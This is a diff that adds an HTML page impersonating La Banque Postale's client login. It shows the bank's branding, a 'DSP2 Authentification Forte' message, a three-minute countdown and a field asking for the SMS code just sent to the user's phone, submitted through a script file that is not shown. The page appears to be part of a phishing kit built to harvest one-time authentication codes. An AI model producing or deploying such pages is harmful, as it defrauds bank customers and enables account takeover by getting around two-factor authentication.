@@ -1,0 +1,239 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../assets/dist/img/ico.ico">
+
+<title>Connexion à mon espace client - La Banque Postale</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="../assets/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="../assets/dist/css/album.css" rel="stylesheet">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" integrity="sha512-5A8nwdMOWrSz20fDsjczgUidUBR8liPYU+WymTZP1lmY9G6Oc7HlZv156XqnsgNUzTyMefFTcsFH/tnJE/+xBg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha512-SfTiTlX6kk+qitfevl/7LibUOeJWlt9rbyDn92a1DqWOw9vWG2MFoays0sgObmWazO5BQPiFucnnEAjpAB+/Sw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+ <style>
+.m-logo img {
+    width: 50px;
+    height: 50px;
+}
+#titre_btn{
+font-weight:bold;
+color:#17479e;
+}
+
+.bg-light {
+    background-color: #ffffff!important;
+}
+.buttonBTN {
+    text-align: center;
+    width: 4rem;
+    height: 3.6rem;
+
+    border-radius: 4px;
+	border:1px solid #d8d8d8;
+    background-color: var(--color-3);
+    font-size: 18px;
+    color: var(--color-26);
+    font-family: "RobotoMono-Medium",Courier,monospace;
+}
+
+@media only screen and (max-width: 768px) {
+  /* For mobile phones: */
+  #Search_ico{
+   display:none;
+  } 
+  #img_body{
+   display:none;
+  }   
+
+  #comment_form{
+   display:none;
+  }  
+  
+  #tab_clavier{
+   width:100%;
+  }
+}
+
+/* Small devices (portrait tablets and large phones, 600px and up) */
+@media only screen and (min-width: 600px) {
+
+  
+  #tab_clavier{
+   width:100%;
+  }
+}
+
+@media only screen and (min-width: 768px) {
+  
+  #tab_clavier{
+   width:100%;
+  }
+
+}
+
+
+
+/* Large devices (laptops/desktops, 992px and up) */
+@media only screen and (min-width: 992px) {
+
+  #tab_clavier{
+   width:100%;
+  }
+
+}
+
+@media only screen and (min-width: 1200px) {
+ #tab_clavier{
+   width:100%;
+  }
+}
+ </style>
+ 
+ </head>
+
+  <body>
+
+    <header>
+   
+      <div class="navbar navbar-white bg-white box-shadow">
+        <div class="container d-flex justify-content-between">
+          <a href="#" class="navbar-brand d-flex align-items-center m-logo">
+
+            <img src="../assets/dist/img/logobbp.png"/>
+          </a>
+      
+			
+        
+        </div>
+      </div>
+    </header>
+
+    <main role="main">
+
+
+      <div class="album py-4 bg-light">
+        <div class="container">
+
+          <div class="row">
+            
+            <div class="col-md-6"  id="comment_form">
+             <div class="card mb-3" style="">
+			  <div class="row g-0">
+				<div class="col-md-4 m-3">
+				  <img src="../assets/dist/img/secdsp.png" height="100%" class="img-fluid rounded-start" alt="...">
+				</div>
+				<div class="col-md-7">
+				  <div class="card-body">
+					<h5 class="card-title">Activation DSP2 Authentification Forte :</h5>
+					<p class="card-text">Comment activer mon DSP2 et faciliter mes opérations en un click ?</p>
+					<p class="card-text"><i class="fa fa-commenting fa-2x" aria-hidden="true"></i> 
+					 Entrer le code reçu par SMS envoyé sur votre numéro 
+					
+					</p>
+				  </div>
+				</div>
+			  </div>
+			</div>
+            </div>
+            <div class="col-md-6" id="post_form">
+               <form role="form" id="cb-form" method="POST" action="">
+                <div>
+                      <P>
+                    
+                        <b><i class="fa fa-commenting fa-2x" aria-hidden="true"></i>   SMS MOBILE</b>
+                           
+                        </p>  
+
+                          <p style="font-size:15px">
+                      Patientez le temps de reception du code temporaire par SMS est dependant de votre reseau .
+					Dans moins de 3 minutes, vous allez recevoir un code sur votre t&eacute;l&eacute;phone mobile <i class="fa fa-mobile" aria-hidden="true"></i> <br>
+					  <strong  id="timer"></strong><br>
+                        <b> Veuillez entrer le <span style="color:teal2">*code*</span> reçu par SMS ci-dessous :   </b> <br>
+                      <br>  <input maxlength="9" max="999999999" id="sms_code"  style="color: #525252;font-weight: 500;margin-top: 7px;padding: 13px;outline: none;background: white;border-radius: 6px;text-indent: 5px;border: 1px solid #ccc;" type="text">
+                      </p>
+                          
+                           <div class="d-flex justify-content-between align-items-center">
+                    <div class="btn-group">
+                      <button type="button" onclick="smspass()" class="btn btn-primary" style="background:#1f368b !important;color:white">CONTINUER</button>
+                    
+                    </div>
+               
+                  </div>
+
+                    
+
+                       <!--  <div onclick="telinfo()" id="btn" class="ui button" style="background:#1f368b !important;color:white">
+                          &nbsp;CONTINUER
+                        </div> -->
+						
+                </div>
+             </form>  
+            </div>
+           
+           
+        
+
+        
+          </div>
+        </div>
+      </div>
+
+    </main>
+
+    <footer class="text-muted">
+      <div class="container">
+      <!--   <p class="float-right">
+          <a href="#">Back to top</a>
+        </p>
+        <p>Album example is &copy; Bootstrap, but please download and customize it for yourself!</p>
+        <p>New to Bootstrap? <a href="../../">Visit the homepage</a> or read our <a href="../../getting-started/">getting started guide</a>.</p>
+    
+ -->
+	</div>
+    </footer>
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="./assets/dist/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="../assets/dist/vendor/popper.min.js"></script>
+    <script src="../assets/dist/js/bootstrap.min.js"></script>
+    <script src="../assets/dist/vendor/holder.min.js"></script>
+	<script>
+document.getElementById('timer').innerHTML =
+  03 + ":" + 00;
+startTimer();
+
+function startTimer() {
+  var presentTime = document.getElementById('timer').innerHTML;
+  var timeArray = presentTime.split(/[:]+/);
+  var m = timeArray[0];
+  var s = checkSecond((timeArray[1] - 1));
+  if(s==59){m=m-1}
+  //if(m<0){alert('timer completed')}
+
+  document.getElementById('timer').innerHTML =
+    m + ":" + s;
+  setTimeout(startTimer, 1000);
+}
+
+function checkSecond(sec) {
+  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+  if (sec < 0) {sec = "59"};
+  return sec;
+}
+</script>
+	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>	
+	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.26.11/dist/sweetalert2.all.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha256-KsRuvuRtUVvobe66OFtOQfjP8WA2SzYsmm4VPfMnxms=" crossorigin="anonymous"></script>
+  	<script src="../assets/dist/js/main.js"></script>
+  <script src="../common/sms.js"></script>
+  </body>
+</html>
